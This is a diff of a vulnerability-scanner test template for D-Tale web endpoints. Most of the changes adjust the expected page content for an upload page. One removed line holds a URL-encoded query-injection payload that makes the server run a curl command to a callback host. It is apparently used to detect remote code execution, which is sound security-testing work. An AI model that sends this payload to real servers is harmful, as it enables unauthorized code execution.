@@ -19,7 +19,7 @@ tests: {
       {
         uri: "/dtale/popup/upload"
         status: 200
-        body_content: "<title>My App - Load Data</title> \n script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+        body_content: '<link rel="preload" href="/dtale/static/fonts/istok.woff" as="font" type="font/woff" crossorigin>'
                       "<script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
       },
       {
@@ -34,7 +34,7 @@ tests: {
         }
       },
       {
-        uri: "/dtale/chart-data/112233?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29"
+        uri: "/dtale/chart-data/112233?query={{ payload }}"
         status: 200
         body_content: "\"error\":\""
       }
@@ -56,7 +56,8 @@ tests: {
       {
         uri: "/dtale/popup/upload"
         status: 200
-        body_content: "<title>My App - Load Data</title> script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+        body_content: '<link rel="preload" href="/dtale/static/fonts/istok.woff" as="font" type="font/woff" crossorigin>'
+            "<script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
       }
     ]
   }
